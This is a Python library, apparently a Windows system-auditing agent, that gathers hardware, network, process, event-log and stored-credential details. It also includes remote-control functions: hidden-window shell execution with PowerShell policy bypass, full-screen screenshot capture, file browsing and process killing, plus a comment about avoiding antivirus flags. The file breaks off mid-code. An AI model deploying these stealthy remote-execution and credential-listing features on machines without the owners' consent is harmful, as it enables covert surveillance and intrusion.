# --- windows_auditor_library.py ---

import os
import re
import json
import shutil
import sqlite3
import getpass
import winreg
import platform
import psutil
import subprocess
import time
import hashlib
import base64
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Union

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Protocol.KDF import PBKDF2
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# --- Added for self-containment of inner classes ---
import socket
import requests 

# --- Conditional Import for pywin32 ---
try:
    import win32print
    from pywintypes import error as PyWinError
    PYWIN32_AVAILABLE = True
except ImportError:
    PYWIN32_AVAILABLE = False
    PyWinError = type('PyWinError', (Exception,), {})

# --- Shared Helper Functions ---

def _run_powershell(command: str, use_bypass: bool = False) -> Any:
    flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
    ps_command_list = ["powershell", "-NoProfile"]
    if use_bypass:
        ps_command_list.extend(["-ExecutionPolicy", "Bypass"])
    ps_command_list.extend(["-Command", command])
    
    try:
        process = subprocess.run(
            ps_command_list, capture_output=True, check=True, creationflags=flags
        )
        # Giải mã thủ công để tránh lỗi khi PowerShell trả về byte không hợp lệ
        stdout_bytes = process.stdout
        try:
            json_output = stdout_bytes.decode('utf-8')
        except UnicodeDecodeError:
            json_output = stdout_bytes.decode('utf-8', errors='replace')  # Thay ký tự lỗi bằng �

        json_output = json_output.strip()
        return json.loads(json_output) if json_output else []
    except FileNotFoundError:
        raise RuntimeError("PowerShell not found. Ensure it's installed and in your PATH.")
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f"PowerShell command failed: {e.stderr}")
    except json.JSONDecodeError as e:
        raise RuntimeError(f"Failed to parse JSON from PowerShell. Error: {e}")

def _parse_dotnet_json_date(date_obj: Any) -> Optional[datetime]:
    date_str = date_obj.get('value') if isinstance(date_obj, dict) else date_obj
    if not isinstance(date_str, str) or "/Date(" not in date_str: return None
    match = re.search(r'\((\d+)\)', date_str)
    if match:
        try:
            return datetime.fromtimestamp(int(match.group(1)) / 1000)
        except (ValueError, IndexError, OverflowError): return None
    return None

class WindowsAuditor:
    """Thư viện thu thập thông tin hệ thống Windows."""

    class _Crypto:
        """Cung cấp các hàm mã hóa AES-256 để bảo vệ dữ liệu nhạy cảm."""
        
        @staticmethod
        def _get_derived_key(password: str, salt: bytes):
            # Sử dụng PBKDF2 để tạo key 32 bytes (256-bit) từ password
            return PBKDF2(password, salt, dkLen=32, count=1000)

        @staticmethod
        def encrypt(data_json: str, password: str) -> str:
            """Mã hóa chuỗi JSON sang dạng Base64 (AES-256-CBC)."""
            if not HAS_CRYPTO or not password:
                return data_json 
            
            try:
                salt = os.urandom(16)
                key = WindowsAuditor._Crypto._get_derived_key(password, salt)
                cipher = AES.new(key, AES.MODE_CBC)
                iv = cipher.iv
                
                encrypted_bytes = cipher.encrypt(pad(data_json.encode('utf-8'), AES.block_size))
                
                # Gói tin: salt(16) + iv(16) + encrypted_data
                combined = salt + iv + encrypted_bytes
                return base64.b64encode(combined).decode('utf-8')
            except Exception as e:
                print(f"[Crypto Error] Encryption failed: {e}")
                return data_json

        @staticmethod
        def decrypt(encrypted_base64: str, password: str) -> str:
            """Giải mã chuỗi Base64 về JSON gốc."""
            if not HAS_CRYPTO or not password:
                return encrypted_base64
            
            try:
                combined = base64.b64decode(encrypted_base64)
                if len(combined) < 33: return encrypted_base64
                
                salt = combined[:16]
                iv = combined[16:32]
                encrypted_bytes = combined[32:]
                
                key = WindowsAuditor._Crypto._get_derived_key(password, salt)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                
                decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
                return decrypted_bytes.decode('utf-8')
            except Exception as e:
                return encrypted_base64

    class _RemoteControl:
        """Cung cấp các chức năng điều khiển từ xa."""

        @staticmethod
        def execute_command(command: str, shell_type: str = "cmd") -> Dict[str, Any]:
            """Thực thi lệnh shell và trả về kết quả."""
            flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            if shell_type == "powershell":
                args = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command]
            else:
                args = ["cmd", "/c", command]
            
            try:
                process = subprocess.Popen(
                    args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                    text=True, creationflags=flags, encoding='utf-8', errors='replace'
                )
                stdout, stderr = process.communicate(timeout=30)
                return {
                    "stdout": stdout,
                    "stderr": stderr,
                    "exit_code": process.returncode
                }
            except subprocess.TimeoutExpired:
                process.kill()
                return {"error": "Command timed out after 30 seconds."}
            except Exception as e:
                return {"error": str(e)}

        @staticmethod
        def get_process_list() -> List[Dict[str, Any]]:
            """Lấy danh sách các tiến trình đang chạy."""
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    pinfo = proc.info
                    processes.append({
                        "pid": pinfo['pid'],
                        "name": pinfo['name'],
                        "user": pinfo['username'],
                        "cpu": pinfo['cpu_percent'],
                        "ram": pinfo['memory_percent']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            return processes

        @staticmethod
        def kill_process(pid: int) -> bool:
            """Kết thúc một tiến trình theo PID."""
            try:
                p = psutil.Process(pid)
                p.terminate()
                return True
            except Exception:
                return False

        @staticmethod
        def take_screenshot() -> Optional[str]:
            """Chụp ảnh màn hình (tất cả màn hình nếu có) và trả về chuỗi Base64."""
            try:
                from PIL import ImageGrab
                import io
                # all_screens=True giúp chụp toàn bộ các màn hình (virtual desktop) trên Windows
                try:
                    screenshot = ImageGrab.grab(all_screens=True)
                except Exception:
                    # Fallback cho các bản Pillow cũ hoặc môi trường không hỗ trợ
                    screenshot = ImageGrab.grab()
                
                img_byte_arr = io.BytesIO()
                screenshot.save(img_byte_arr, format='JPEG', quality=70)
                return base64.b64encode(img_byte_arr.getvalue()).decode('utf-8')
            except Exception as e:
                print(f"[RemoteControl] Screenshot error: {e}")
                return None

        @staticmethod
        def list_dir(path: str) -> Dict[str, Any]:
            """Liệt kê danh sách file và thư mục."""
            if not path or path == "drives":
                # Trả về danh sách ổ đĩa nếu path trống hoặc là "drives"
                if platform.system() == "Windows":
                    import ctypes
                    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                    drives = []
                    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                        if bitmask & 1:
                            drives.append(f"{letter}:\\")
                        bitmask >>= 1
                    return {"type": "drives", "items": drives}
                else:
                    path = "/"

            try:
                items = []
                for entry in os.scandir(path):
                    try:
                        info = entry.stat()
                        items.append({
                            "name": entry.name,
                            "is_dir": entry.is_dir(),
                            "size": info.st_size if not entry.is_dir() else 0,
                            "mtime": info.st_mtime
                        })
                    except Exception:
                        continue
                return {"type": "directory", "path": path, "items": items}
            except Exception as e:
                return {"error": str(e)}

    class _Usage:

        _disk_name_cache = None
        # Biến lưu trữ trạng thái để tính toán tốc độ I/O không dùng sleep
        _last_disk_io = {}
        _last_disk_time = 0
        _last_net_io = {}
        _last_net_time = 0

        @staticmethod
        def _get_disk_model_map():
            if WindowsAuditor._Usage._disk_name_cache is not None:
                return WindowsAuditor._Usage._disk_name_cache

            print("[Metrics Helper] Caching disk model names via _DiskAudit...")
            
            local_cache = {}
            try:
                disk_auditor = WindowsAuditor._DiskAudit()
                physical_disks_info = disk_auditor.get_details().get("PhysicalDisks", [])
                
                for disk in physical_disks_info:
                    device_id_raw = disk.get("DeviceID")
                    model = disk.get("Model")
                    
                    if device_id_raw and model:
                        # Chuẩn hóa DeviceID
                        physical_name_from_audit = device_id_raw.rsplit('\\', 1)[-1]
                        
                        # --- CẢI TIẾN QUAN TRỌNG: Chuẩn hóa key về chữ thường ---
                        standardized_key = physical_name_from_audit.lower()
                        
                        if model.strip():
                            local_cache[standardized_key] = model.strip()

            except Exception as e:
                print(f"[Metrics Helper Error] Could not cache disk names using _DiskAudit: {e}")
            
            WindowsAuditor._Usage._disk_name_cache = local_cache           
            return WindowsAuditor._Usage._disk_name_cache

        @staticmethod
        def get_cpu_usage():
            return psutil.cpu_percent(interval=0.1)

        @staticmethod
        def get_ram_usage():
            return psutil.virtual_memory().percent
        
        @staticmethod
        def get_disk_usage():
            """Tính trung bình cộng % sử dụng của tất cả các ổ đĩa vật lý > 1GB."""
            try:
                total_percent = 0.0
                count = 0
                for part in psutil.disk_partitions(all=False):
                    if not part.fstype: continue
                    try:
                        usage = psutil.disk_usage(part.mountpoint)
                        if usage.total > 1073741824: # > 1GB
                            total_percent += usage.percent
                            count += 1
                    except (PermissionError, OSError): continue
                return float(total_percent / count) if count > 0 else 0.0
            except Exception: return 0.0

        @staticmethod
        def get_disk_io_per_disk():
            """
            Trả về tốc độ đọc/ghi (bytes/s) cho TẤT CẢ các ổ đĩa vật lý,
            sử dụng cơ chế delta-time không gây treo (no sleep).
            """
            disk_name_map = WindowsAuditor._Usage._get_disk_model_map()
            current_io = psutil.disk_io_counters(perdisk=True)
            current_time = time.time()
            
            last_io = WindowsAuditor._Usage._last_disk_io
            last_time = WindowsAuditor._Usage._last_disk_time
            
            # Cập nhật trạng thái cho lần gọi sau
            WindowsAuditor._Usage._last_disk_io = current_io
            WindowsAuditor._Usage._last_disk_time = current_time

            results = {}
            
            # Nếu là lần gọi đầu tiên, trả về 0 cho tất cả nhưng vẫn lưu state
            if not last_io:
                return {f"DISK {i}: {disk_name_map.get(k, 'Unknown')}": {"read_bytes_per_sec": 0, "write_bytes_per_sec": 0} 
                        for i, k in enumerate(sorted(disk_name_map.keys()))}

            interval = current_time - last_time
            if interval <= 0: interval = 1 # Tránh chia cho 0

            sorted_keys = sorted(disk_name_map.keys(), key=lambda x: int(''.join(filter(str.isdigit, x))))
            
            for i, standardized_key in enumerate(sorted_keys):
                model_name = disk_name_map.get(standardized_key, "Unknown Model")
                display_name = f"DISK {i}: {model_name}"

                # Tìm key trong psutil
                psutil_key = next((k for k in current_io.keys() if k.lower() == standardized_key), None)

                read_bps, write_bps = 0, 0
                if psutil_key and psutil_key in last_io:
                    read_bps = (current_io[psutil_key].read_bytes - last_io[psutil_key].read_bytes) / interval
                    write_bps = (current_io[psutil_key].write_bytes - last_io[psutil_key].write_bytes) / interval
                
                results[display_name] = {
                    "read_bytes_per_sec": max(0, read_bps), 
                    "write_bytes_per_sec": max(0, write_bps)
                }
            return results 
            
        @staticmethod
        def get_network_io_per_nic():
            """Trả về lưu lượng mạng (bits/s) sử dụng cơ chế delta-time không sleep."""
            nic_stats = psutil.net_if_stats()
            current_io = psutil.net_io_counters(pernic=True)
            current_time = time.time()

            last_io = WindowsAuditor._Usage._last_net_io
            last_time = WindowsAuditor._Usage._last_net_time

            WindowsAuditor._Usage._last_net_io = current_io
            WindowsAuditor._Usage._last_net_time = current_time

            results = {}
            if not last_io:
                return {n: {"upload_bits_per_sec": 0, "download_bits_per_sec": 0} for n, s in nic_stats.items() if s.isup}

            interval = current_time - last_time
            if interval <= 0: interval = 1

            for nic_name, stats in nic_stats.items():
                if stats.isup and "loopback" not in nic_name.lower():
                    upload_bps, download_bps = 0, 0
                    if nic_name in current_io and nic_name in last_io:
                        upload_bps = (current_io[nic_name].bytes_sent - last_io[nic_name].bytes_sent) * 8 / interval
                        download_bps = (current_io[nic_name].bytes_recv - last_io[nic_name].bytes_recv) * 8 / interval
                    
                    results[nic_name] = {
                        "upload_bits_per_sec": max(0, upload_bps), 
                        "download_bits_per_sec": max(0, download_bps)
                    }
            return results

    class _Ip:
        def get_local_ip():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80)) # Connect to a public DNS server
                ip = s.getsockname()[0]
                s.close()
                return ip
            except Exception:
                return "N/A"

        def get_wan_ip():
            try:
                response = requests.get("https://api.ipify.org", timeout=5)
                return response.text
            except requests.exceptions.RequestException:
                return "N/A"

    class _CpuAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            try:
                command = "Get-CimInstance -ClassName Win32_Processor | Select-Object Name, Manufacturer, Architecture, AddressWidth | ConvertTo-Json"
                wmi_data = _run_powershell(command)
                processor = wmi_data if isinstance(wmi_data, dict) else wmi_data[0]
                arch_map = {0: "x86", 5: "ARM", 6: "Itanium", 9: "x86_64", 12: "ARM64"}
                arch_string = arch_map.get(processor.get('Architecture', -1), "Unknown")
                self._details = {
                    "Brand": processor.get('Name', 'N/A').strip(), "Vendor": processor.get('Manufacturer', 'N/A').strip(),
                    "Architecture": arch_string, "Bits": processor.get('AddressWidth', 'N/A'),
                    "Physical Cores": psutil.cpu_count(logical=False), "Logical Cores": psutil.cpu_count(logical=True),
                    "Processor": platform.processor(), "Machine": platform.machine(), "System": platform.system(),
                    "Release": platform.release(), "Version": platform.version(), "Platform": platform.platform()
                }
            except Exception as e: self._details = {"Error": f"Could not retrieve CPU info: {e}"}
            return self._details

    class _CredentialAudit:
        def __init__(self): self._details: Dict[str, List[Dict[str, str]]] = {}
        def _fetch_raw_credentials(self) -> List[Dict[str, str]]:
            try:
                si = subprocess.STARTUPINFO(); si.dwFlags |= subprocess.STARTF_USESHOWWINDOW; cf = subprocess.CREATE_NO_WINDOW
                output = subprocess.check_output("cmdkey /list", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf)
                creds, current_cred = [], {}
                for line in output.splitlines():
                    line = line.strip()
                    if not line:
                        if current_cred: creds.append(current_cred)
                        current_cred = {}; continue
                    if line.startswith("Target:"): current_cred["Target"] = line.replace("Target:", "").strip()
                    elif line.startswith("Type:"): current_cred["Type"] = line.replace("Type:", "").strip()
                    elif line.startswith("User:"): current_cred["User"] = line.replace("User:", "").strip()
                if current_cred: creds.append(current_cred)
                return creds
            except subprocess.CalledProcessError: return []
            except Exception as e: return [{"Error": str(e)}]
        def _classify_credentials(self, raw_creds: List[Dict[str, str]]) -> Dict[str, List]:
            classified = {"Web": [], "Windows": [], "Other": []}
            WEB_KW = ('microsoftaccount', 'sso_saml', 'github', 'google', 'http', 'git:')
            WIN_KW = ('domain password', 'rdp', 'remotecontrol')
            for cred in raw_creds:
                if "Error" in cred: classified["Other"].append(cred); continue
                target, ctype = cred.get("Target", "").lower(), cred.get("Type", "").lower()
                if any(k in target for k in WEB_KW): classified["Web"].append(cred)
                elif ctype in WIN_KW or any(k in target for k in WIN_KW): classified["Windows"].append(cred)
                else: classified["Other"].append(cred)
            return classified
        def get_details(self) -> Dict[str, List[Dict[str, str]]]:
            if not self._details: self._details = self._classify_credentials(self._fetch_raw_credentials())
            return self._details

    class _DiskAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            phys_script = r"""
            Get-CimInstance -ClassName Win32_DiskDrive | ForEach-Object {
                $d = $_; $pData = @();
                $ps = Get-CimAssociatedInstance -InputObject $d -ResultClassName Win32_DiskPartition
                foreach ($p in $ps) {
                    $lData = @();
                    $ls = Get-CimAssociatedInstance -InputObject $p -ResultClassName Win32_LogicalDisk
                    foreach ($l in $ls) { $lData += @{ DeviceID = $l.DeviceID; VolumeName = $l.VolumeName; FileSystem = $l.FileSystem; Size = $l.Size; FreeSpace = $l.FreeSpace } }
                    if ($lData.Count -gt 0) { $pData += @{ DeviceID = $p.DeviceID; Type = $p.Type; Size = $p.Size; LogicalDisks = $lData } }
                }
                if ($pData.Count -gt 0) { @{ DeviceID = $d.DeviceID; Model = $d.Model.Trim(); SerialNumber = $d.SerialNumber.Trim(); InterfaceType = $d.InterfaceType; MediaType = $d.MediaType; Status = $d.Status; Size = $d.Size; Partitions = $pData } }
            } | ConvertTo-Json -Depth 10
            """
            net_script = "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType = 4' | Select-Object DeviceID, ProviderName | ConvertTo-Json"
            # Thêm logical_script để lấy thông tin chi tiết các ổ đĩa cố định > 1GB
            logical_script = "Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -and $_.Size -gt 1073741824 } | Select-Object DeviceID, VolumeName, FileSystem, Size, FreeSpace | ConvertTo-Json"

            try:
                phys_disks = _run_powershell(phys_script, use_bypass=True) or []
                net_drives = _run_powershell(net_script) or []
                logical_drives = _run_powershell(logical_script) or []

                self._details = {
                    "PhysicalDisks": [phys_disks] if isinstance(phys_disks, dict) else phys_disks, 
                    "NetworkDrives": [net_drives] if isinstance(net_drives, dict) else net_drives,
                    "LogicalDisks": [logical_drives] if isinstance(logical_drives, dict) else logical_drives
                }

            except Exception as e: self._details = {"Error": f"Could not retrieve disk info: {e}"}
            return self._details


    class _EventLogAudit:
        def __init__(self, max_events: int = 25): 
            self._details, self.max_events = [], max_events
            
        def get_details(self) -> List[Dict[str, Any]]:
            if self._details: return self._details
            
            ps_script = f"Get-WinEvent -LogName System -EA SilentlyContinue | Select-Object -First {self.max_events} -Prop TimeCreated,ProviderName,Id,LevelDisplayName,Message,UserId | ConvertTo-Json -Depth 3"
            
            try:
                raw_events = _run_powershell(ps_script)
                processed_events = []
                
                if isinstance(raw_events, dict):
                    raw_events = [raw_events]

                for event in raw_events:
                    if event is None:
                        continue
                        
                    dt_obj = _parse_dotnet_json_date(event.get("TimeCreated"))
                    event["TimeCreated"] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else None
                    
                    user_id_obj = event.get("UserId")
                    event["UserSid"] = user_id_obj.get("Value") if isinstance(user_id_obj, dict) else None
                    if "UserId" in event: 
                        del event["UserId"]
                    
                    if "Message" in event and event.get("Message"): 
                        event["Message"] = event["Message"].replace('\r\n', ' ').strip()
                    
                    processed_events.append(event)

                self._details = processed_events
            except Exception as e: 
                self._details = [{"Error": f"Could not retrieve 'System' event log: {e}"}]
            return self._details

    class _GpuAudit:
        def __init__(self): self._details: List[Dict[str, Any]] = []
        def get_details(self) -> List[Dict[str, Any]]:
            if self._details: return self._details
            props = "Name,AdapterRAM,DriverVersion,DriverDate,Status,VideoProcessor,VideoModeDescription"
            ps_script = f"Get-CimInstance Win32_VideoController | Select-Object {props} | ConvertTo-Json -Depth 2"
            try:
                raw_data = _run_powershell(ps_script)
                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
                if not raw_data: self._details = [{"Info": "No GPU found"}]; return self._details
                
                processed_gpus = []
                for gpu in raw_data:
                    dt = _parse_dotnet_json_date(gpu.get("DriverDate"))
                    try: vram = int(gpu.get("AdapterRAM") or 0)
                    except (ValueError, TypeError): vram = None
                    processed_gpus.append({
                        "Name": gpu.get("Name"), "VRAM_Bytes": vram,
                        "DriverVersion": gpu.get("DriverVersion"),
                        "DriverDate": dt.strftime("%Y-%m-%d") if dt else None,
                        "Status": gpu.get("Status"),
                    })
                self._details = processed_gpus
            except Exception as e: self._details = [{"Error": f"Could not get GPU info: {e}"}]
            return self._details

    class _MainboardAudit:
        def __init__(self): self._details: Dict[str, Any] = {}
        def _wmic_query(self, cls: str, fields: str) -> Dict[str, Any]:
            si=subprocess.STARTUPINFO(); si.dwFlags|=subprocess.STARTF_USESHOWWINDOW; cf=subprocess.CREATE_NO_WINDOW
            try:
                res = subprocess.check_output(f"wmic {cls} get {fields} /format:list", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf)
                return {k.strip(): v.strip() for k, v in (line.split("=", 1) for line in res.strip().splitlines() if "=" in line)}
            except Exception as e: return {f"{cls} Error": str(e)}
        def get_details(self) -> Dict[str, Any]:
            if self._details: return self._details
            bb_info = self._wmic_query("baseboard", "Manufacturer,Product,Model,SerialNumber,Version")
            bios_info = self._wmic_query("bios", "Manufacturer,SMBIOSBIOSVersion,ReleaseDate,Version,SerialNumber")
            self._details = {
                "BaseBoard": {"Manufacturer": bb_info.get("Manufacturer"), "Product": bb_info.get("Product"), "Model": bb_info.get("Model") or bb_info.get("Product"), "SerialNumber": bb_info.get("SerialNumber"), "Version": bb_info.get("Version")},
                "BIOS": {"Manufacturer": bios_info.get("Manufacturer"), "Version": bios_info.get("SMBIOSBIOSVersion") or bios_info.get("Version"), "ReleaseDate": bios_info.get("ReleaseDate"), "SerialNumber": bios_info.get("SerialNumber")}
            }
            return self._details

    class _MonitorAudit:
        def __init__(self): self._details: List[Dict[str, Any]] = []
        def get_details(self) -> List[Dict[str, Any]]:
            if self._details: return self._details
            ps_script = r"""
            try {
                Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
                $screens = [System.Windows.Forms.Screen]::AllScreens
            } catch {
                $screens = @()
            }

            try {
                $wmi_monitors = Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorID -ErrorAction SilentlyContinue
            } catch {
                $wmi_monitors = @()
            }

            $results = @()

            if ($wmi_monitors) {
                for ($i = 0; $i -lt $wmi_monitors.Count; $i++) {
                    $id = $wmi_monitors[$i]
                    
                    $name_bytes = $id.UserFriendlyName | Where-Object { $_ -ne 0 }
                    $name = if ($name_bytes) { [System.Text.Encoding]::ASCII.GetString($name_bytes).Trim() } else { "" }
                    if (!$name) {
                        $prod_bytes = $id.ProductCodeID | Where-Object { $_ -ne 0 }
                        $name = if ($prod_bytes) { [System.Text.Encoding]::ASCII.GetString($prod_bytes).Trim() } else { "Generic Monitor" }
                    }
                    
                    $manu_bytes = $id.ManufacturerName | Where-Object { $_ -ne 0 }
                    $manu = if ($manu_bytes) { [System.Text.Encoding]::ASCII.GetString($manu_bytes).Trim() } else { "Unknown" }
                    
                    $serial_bytes = $id.SerialNumberID | Where-Object { $_ -ne 0 }
                    $serial = if ($serial_bytes) { [System.Text.Encoding]::ASCII.GetString($serial_bytes).Trim() } else { "N/A" }

                    $conn = Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorConnectionParams -ErrorAction SilentlyContinue | Where-Object { $_.InstanceName -eq $id.InstanceName }
                    $conn_type = "Unknown"
                    if ($conn) {
                        $types = @{
                            0 = "VGA"; 1 = "DVI-D"; 2 = "DVI-I"; 3 = "Composite"; 4 = "S-Video";
                            5 = "Component"; 6 = "Notebook Internal"; 7 = "SDI"; 8 = "FireWire";
                            9 = "HDMI"; 10 = "LVDS"; 11 = "DisplayPort"; 255 = "Unknown"
                        }
                        $vstd = $conn.VideoStandard
                        $conn_type = if ($types.ContainsKey($vstd)) { $types[$vstd] } else { "Digital ($vstd)" }
                    }

                    $resolution = "Unknown"
                    $is_primary = $false
                    if ($i -lt $screens.Count) {
                        $screen = $screens[$i]
                        $resolution = "$($screen.Bounds.Width) x $($screen.Bounds.Height)"
                        $is_primary = $screen.Primary
                    }

                    $results += [PSCustomObject]@{
                        Name = $name
                        Manufacturer = $manu
                        SerialNumber = $serial
                        ConnectionType = $conn_type
                        Resolution = $resolution
                        IsPrimary = $is_primary
                    }
                }
            }

            if ($results.Count -eq 0 -and $screens) {
                foreach ($screen in $screens) {
                    $dev_name = $screen.DeviceName
                    $wmi_desktop = Get-CimInstance Win32_DesktopMonitor -ErrorAction SilentlyContinue | Where-Object { $_.DeviceID -eq $dev_name -or $_.Name -like "*$dev_name*" }
                    
                    $name = if ($wmi_desktop) { $wmi_desktop.Name } else { "Generic Monitor" }
                    $manu = if ($wmi_desktop) { $wmi_desktop.MonitorManufacturer } else { "Unknown" }
                    $type = if ($wmi_desktop) { $wmi_desktop.MonitorType } else { "Virtual Display" }

                    $results += [PSCustomObject]@{
                        Name = $name
                        Manufacturer = $manu
                        SerialNumber = "N/A"
                        ConnectionType = $type
                        Resolution = "$($screen.Bounds.Width) x $($screen.Bounds.Height)"
                        IsPrimary = $screen.Primary
                    }
                }
            }

            if ($results.Count -eq 0) {
                $video = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
                $desktop_monitors = Get-CimInstance Win32_DesktopMonitor -ErrorAction SilentlyContinue
                
                if ($desktop_monitors) {
                    foreach ($mon in $desktop_monitors) {
                        $resolution = "Unknown"
                        if ($video) {
                            $resolution = "$($video.CurrentHorizontalResolution) x $($video.CurrentVerticalResolution)"
                        }
                        $results += [PSCustomObject]@{
                            Name = $mon.Name
                            Manufacturer = $mon.MonitorManufacturer
                            SerialNumber = "N/A"
                            ConnectionType = $mon.MonitorType
                            Resolution = $resolution
                            IsPrimary = $true
                        }
                    }
                }
            }

            $results | ConvertTo-Json
            """
            try:
                raw_data = _run_powershell(ps_script)
                self._details = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
            except Exception as e:
                self._details = [{"Error": f"Could not get monitor info: {e}"}]
            return self._details

    class _NetworkAudit:
        def __init__(self): self._details: List[Dict[str, Any]] = []
        def get_details(self) -> List[Dict[str, Any]]:
            if self._details: return self._details
            ps_script = """
            Get-CimInstance Win32_NetworkAdapterConfiguration | ForEach-Object {
                $c = $_; $a = Get-CimInstance Win32_NetworkAdapter -Filter "PhysicalAdapter = true AND InterfaceIndex = $($c.InterfaceIndex)"
                if ($a) { [PSCustomObject]@{ Description=$c.Description; MACAddress=$c.MACAddress; IPAddresses=$c.IPAddress;
                    DefaultGateway=$c.DefaultIPGateway; DNSServers=$c.DNSServerSearchOrder; DHCPEnabled=$c.DHCPEnabled;
                    NetConnectionID=$a.NetConnectionID; Manufacturer=$a.Manufacturer; Speed=$a.Speed; Status=$a.NetConnectionStatus } }
            } | ConvertTo-Json -Depth 4
            """
            status_map = {0:"Disconnected", 1:"Connecting", 2:"Connected", 3:"Disconnecting", 7:"Media disconnected"}
            try:
                raw_data = _run_powershell(ps_script)
                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
                for item in raw_data:
                    item['Status'] = status_map.get(item.get('Status'), f"Unknown ({item.get('Status')})")
                    item['Speed'] = item.pop('Speed', 0)
                self._details = raw_data
            except Exception as e: self._details = [{"Error": f"Could not get network info: {e}"}]
            return self._details

    class _PrinterAudit:
        def __init__(self):
            self._details: List[Dict[str, Any]] = []


        def get_details(self) -> List[Dict[str, Any]]:
            if self._details:
                return self._details

            if not PYWIN32_AVAILABLE:
                self._details = [{"Error": "pywin32 not installed. Cannot access printer info."}]
                return self._details

            default_printer = win32print.GetDefaultPrinter()

            try:
                printers_raw = win32print.EnumPrinters(
                    win32print.PRINTER_ENUM_LOCAL | win32print.PRINTER_ENUM_CONNECTIONS,
                    None,
                    2
                )
                processed = []
                for p in printers_raw:
                    status_code = p.get("Status", 0)
                    attr_code = p.get("Attributes", 0)
                    
                    # Việc xác định "Online" sẽ được chuyển sang JS.
                    # Tuy nhiên, vẫn có thể giữ lại ở đây để tiện cho các mục đích khác.
                    # 0x80 là cờ OFFLINE.
                    is_online = (status_code & 0x80) == 0

                    processed.append({
                        "Printer Name": p.get("pPrinterName"),
                        "Default": (p.get("pPrinterName") == default_printer),
                        "Online": is_online, # Giữ lại trường này cho tiện
                        "Status": status_code, # Trả về mã số gốc
                        "Driver Name": p.get("pDriverName"),
                        "Jobs in Queue": p.get("cJobs", 0),
                        "Port Name": p.get("pPortName"),
                        "Attributes": attr_code
                    })

                self._details = processed

            except Exception as e:
                self._details = [{"Error": f"Failed to retrieve printers: {e}"}]

            return self._details


    class _ProcessAudit:
        def __init__(self): self._details: Dict[str, List[Dict[str, Any]]] = {}
        def get_details(self) -> Dict[str, List[Dict[str, Any]]]:
            if self._details: return self._details
            grouped = {}
            attrs = ['pid', 'name', 'username', 'exe', 'status', 'create_time', 'memory_info']
            for p in psutil.process_iter(attrs):
                try:
                    info = p.info
                    if not info.get('name'): continue
                    user = info.get('username') or "N/A"
                    if user not in grouped: grouped[user] = []
                    grouped[user].append({
                        "PID": info['pid'], "Name": info['name'], "Status": info['status'],
                        "CreateTime": datetime.fromtimestamp(info['create_time']).strftime("%Y-%m-%d %H:%M:%S"),
                        "MemoryRSS": info['memory_info'].rss if info.get('memory_info') else None, "ExePath": info.get('exe') or '',
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied): continue
            self._details = grouped
            return self._details

    class _RamAudit:
        def __init__(self): 
            self._details: List[Dict[str, Any]] = []

        @staticmethod
        def _decode_hex_to_ascii(hex_str: str) -> str:
            if not isinstance(hex_str, str) or not hex_str.lower().startswith('0x'):
                return hex_str.strip()
            try:
                hex_part = hex_str[2:]
                decoded_bytes = bytes.fromhex(hex_part)
                return decoded_bytes.decode('ascii', errors='ignore').strip('\x00').strip()
            except (ValueError, TypeError):
                return hex_str

        def get_details(self) -> List[Dict[str, Any]]:
            if self._details: return self._details            
            props = "DeviceLocator,Capacity,Manufacturer,PartNumber,SerialNumber,Speed,MemoryType,FormFactor"
            cmd = f"Get-CimInstance -ClassName Win32_PhysicalMemory | Select-Object {props} | ConvertTo-Json"

            try:
                raw_modules = _run_powershell(cmd)
                raw_modules = [raw_modules] if isinstance(raw_modules, dict) else (raw_modules or [])
                
                processed_modules = []
                for i, module in enumerate(raw_modules, 1):
                    part_number = self._decode_hex_to_ascii(module.get('PartNumber', 'N/A'))

                    processed_modules.append({
                        "Slot": module.get('DeviceLocator', f'Slot {i}').strip(), 
                        "Capacity": int(module.get('Capacity', 0)),
                        "Speed": module.get('Speed', 0), 
                        "Manufacturer": str(module.get('Manufacturer', 'N/A')).strip(),
                        "PartNumber": part_number,
                        "SerialNumber": str(module.get('SerialNumber', 'N/A')).strip(),
                        "MemoryType": module.get('MemoryType'),
                        "FormFactor": module.get('FormFactor')
                    })
                self._details = processed_modules
            except Exception as e: 
                self._details = [{"Error": f"Could not get RAM info: {e}"}]
            return self._details

    class _ServiceAudit:
        def __init__(self): self._details: Dict[str, List[Dict[str, Any]]] = {}
        def get_details(self) -> Dict[str, List[Dict[str, Any]]]:
            if self._details: return self._details
            
            # --- CẢI TIẾN: Sử dụng psutil thay vì PowerShell để lấy danh sách services ---
            # Điều này nhanh hơn và ít bị AV gắn cờ hơn.
            grouped = {}
            try:
                for s in psutil.win_service_iter():
